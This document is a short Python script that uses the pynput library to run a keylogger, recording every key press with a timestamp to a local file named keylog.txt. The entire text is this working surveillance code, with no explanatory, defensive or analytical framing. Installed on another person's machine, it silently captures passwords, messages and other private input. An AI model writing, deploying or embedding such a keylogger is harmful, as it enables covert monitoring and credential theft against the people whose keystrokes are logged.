from pynput.keyboard import Key, Listener
import logging

# Set up logging to log keystrokes to a file
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format="%(asctime)s - %(message)s")

def on_press(key):
    logging.info(str(key))

# Set up the listener
with Listener(on_press=on_press) as listener:
    listener.join()
